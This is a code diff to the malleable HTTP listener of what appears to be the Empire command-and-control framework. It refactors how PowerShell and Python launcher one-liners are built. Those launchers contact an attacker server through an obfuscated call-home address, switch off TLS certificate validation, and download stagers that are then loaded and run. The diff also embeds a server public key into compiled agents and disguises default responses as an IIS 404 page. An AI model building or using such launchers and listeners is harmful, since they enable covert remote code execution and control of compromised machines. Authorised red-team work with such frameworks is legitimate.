@@ -31,6 +31,11 @@ from empire.server.utils import cert_util, data_util, listener_util, log_util
 LOG_NAME_PREFIX = __name__
 log = logging.getLogger(__name__)
 
+# Separates header entries patched into the PowerShell stager's $customHeaders;
+# http_malleable.ps1.j2 splits on the same literal. A comma would tear apart a
+# User-Agent such as "(KHTML, like Gecko)".
+STAGER_HEADER_SEPARATOR = "<HEND>"
+
 
 class Listener:
     def __init__(self, mainMenu: MainMenu):
@@ -197,15 +202,20 @@ class Listener:
         "http://None/..." download URL into the launcher template and
         fail silently on target.
         """
-        if self.host_address is None:
-            raise RuntimeError(
-                f"stager_url() called before host_address is set on listener "
-                f"{self.options['Name']['Value']!r}; listener may not be started"
-            )
+        host_address = self._require_host_address("stager_url")
         profile = malleable.Profile._deserialize(self.serialized_profile)
         uris = profile.stager.client.uris or ["/"]
         uri = secrets.choice(uris)
-        return f"{self.host_address}{uri.lstrip('/')}"
+        return f"{host_address}{uri.lstrip('/')}"
+
+    def _require_host_address(self, caller: str) -> str:
+        """host_address, or a clear error when the listener has not started."""
+        if self.host_address is None:
+            raise RuntimeError(
+                f"{caller}() called before host_address is set on listener "
+                f"{self.options['Name']['Value']!r}; listener may not be started"
+            )
+        return self.host_address
 
     def generate_launcher(
         self,
@@ -232,15 +242,12 @@ class Listener:
         # extract the set options for this instantiated listener
         listenerOptions = active_listener.options
 
-        port = listenerOptions["Port"]["Value"]
-        host = listenerOptions["Host"]["Value"]
         launcher = listenerOptions["Launcher"]["Value"]
         stagingKey = listenerOptions["StagingKey"]["Value"]
+        host_address = self._require_host_address("generate_launcher")
 
         # build profile
         profile = malleable.Profile._deserialize(self.serialized_profile)
-        profile.stager.client.host = host
-        profile.stager.client.port = port
         profile.stager.client.path = profile.stager.client.random_uri()
 
         if user_agent and user_agent.lower() != "default":
@@ -283,17 +290,14 @@ class Listener:
             launcherBase += "$wc=New-Object System.Net.WebClient;"
             launcherBase += (
                 "$ser="
-                + helpers.obfuscate_call_home_address(
-                    profile.stager.client.scheme + "://" + profile.stager.client.netloc
-                )
+                + helpers.obfuscate_call_home_address(host_address.rstrip("/"))
                 + ";$t='"
-                + profile.stager.client.path
-                + profile.stager.client.query
+                + profile.stager.client.request_target
                 + "';"
             )
 
             # ==== HANDLE SSL ====
-            if profile.stager.client.scheme == "https":
+            if host_address.startswith("https"):
                 # allow for self-signed certificates for https connections
                 launcherBase += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
 
@@ -391,14 +395,14 @@ class Listener:
             launcherBase += "import urllib.request,urllib.parse\n"
 
             # ==== HANDLE SSL ====
-            if profile.stager.client.scheme == "https":
+            if host_address.startswith("https"):
                 launcherBase += "import ssl\n"
                 launcherBase += "if hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context\n"
 
             for bypass in bypasses:
                 launcherBase += bypass
 
-            launcherBase += f"server='{self.host_address}'\n"
+            launcherBase += f"server='{host_address}'\n"
 
             # ==== CONFIGURE PROXY ====
             if proxy and proxy.lower() != "none":
@@ -455,7 +459,12 @@ class Listener:
 
             # ==== BUILD REQUEST ====
             launcherBase += "vreq=type('vreq',(urllib.request.Request,object),{'get_method':lambda self:self.verb if (hasattr(self,'verb') and self.verb) else urllib.request.Request.get_method(self)})\n"
-            launcherBase += f"req=vreq('{profile.stager.client.url}', {profile.stager.client.body})\n"
+            # server ends in "/"; a leading slash here would request "//init/",
+            # which Werkzeug answers with a 308 that older urllib does not follow.
+            target = profile.stager.client.request_target.lstrip("/")
+            launcherBase += (
+                f"req=vreq(server+'{target}', {profile.stager.client.body})\n"
+            )
             launcherBase += "req.verb='" + profile.stager.client.verb + "'\n"
 
             # ==== ADD HEADERS ====
@@ -526,6 +535,13 @@ class Listener:
                 )
             )
             public_key_array = ",".join(f"0x{b:02x}" for b in raw_key_bytes)
+            server_public_key_array = ",".join(
+                f"0x{b:02x}"
+                for b in self.server_private_cert_key_object.public_key().public_bytes(
+                    encoding=serialization.Encoding.Raw,
+                    format=serialization.PublicFormat.Raw,
+                )
+            )
 
             # SharpireMalleable.yaml pulls in TWO source libraries (Sharpire
             # base + SharpireMalleable extension) so EmpireCompiler globs both
@@ -553,6 +569,7 @@ class Listener:
                 )
                 .replace("{{ agent_private_cert_key }}", private_key_array)
                 .replace("{{ agent_public_cert_key }}", public_key_array)
+                .replace("{{ server_public_cert_key }}", server_public_key_array)
             )
 
             return str(
@@ -657,7 +674,7 @@ class Listener:
 
             # patch in custom headers
             if profile.stager.client.headers:
-                headers = ",".join(
+                headers = STAGER_HEADER_SEPARATOR.join(
                     [
                         ":".join([k.replace(":", "%3A"), v.replace(":", "%3A")])
                         for k, v in profile.stager.client.headers.items()
@@ -743,7 +760,7 @@ class Listener:
                 self.instance_log.error(msg)
                 log.error(msg)
                 raise ModuleExecutionException(msg)
-            return Path(binary_path).read_bytes()
+            return listener_util.read_stager_artifact(binary_path)
 
         log.error(
             "listeners/http_malleable generate_stager(): invalid language specification, only 'powershell', 'python', 'csharp', and 'go' are currently supported for this module."
@@ -1458,6 +1475,13 @@ class ExtendedPacketHandler(PacketHandler):
                     response.headers.setdefault(name, value)
                 return response
 
+        # 404 rather than 200, matching the plain http listener and every other
+        # default-response return in this file: default.html *is* an IIS "404 -
+        # File or directory not found" body, so pairing it with a 200 is itself
+        # an anomaly, and a launcher one-liner that DownloadData()s a stager URI
+        # must see the failure rather than Assembly.Load() an HTML page.
+        listener_util.register_default_response_error_handler(app, self, 404)
+
         @app.route("/", methods=["GET", "POST"])
         @app.route("/<path:request_uri>", methods=["GET", "POST"])
         def handle_request(request_uri="", tempListenerOptions=None):
@@ -1891,7 +1915,7 @@ class ExtendedPacketHandler(PacketHandler):
                         )
 
                 else:
-                    # If no agentinfo then attempt to send ironpython agent
+                    # If no agentinfo then attempt to send ironpython agent.
                     with SessionLocal.begin() as db:
                         obfuscation_config = (
                             self.mainMenu.obfuscationv2.get_obfuscation_config(
@@ -1899,17 +1923,23 @@ class ExtendedPacketHandler(PacketHandler):
                             )
                         )
                         obfuscation = obfuscation_config.enabled
-                        launcher = self.mainMenu.stagergenv2.generate_launcher(
-                            listener_name=listenerName,
-                            language="python",
-                            encode=False,
-                            obfuscate=obfuscation,
-                        )
+
+                    # Outside the session on purpose: generate_launcher() opens
+                    # its own SessionLocal.begin(), so calling it from inside
+                    # this one holds two pooled connections per unauthenticated
+                    # request and 13 concurrent peers exhaust the whole
+                    # process's pool (pool_size 10 + max_overflow 15).
+                    launcher = self.mainMenu.stagergenv2.generate_launcher(
+                        listener_name=listenerName,
+                        language="python",
+                        encode=False,
+                        obfuscate=obfuscation,
+                    )
 
                     directory = self.mainMenu.stagergenv2.generate_python_exe(
                         launcher, dot_net_version="net40", obfuscate=obfuscation
                     )
-                    return Path(directory).read_bytes()
+                    return listener_util.read_stager_artifact(directory)
 
                 # log invalid request
                 message = (
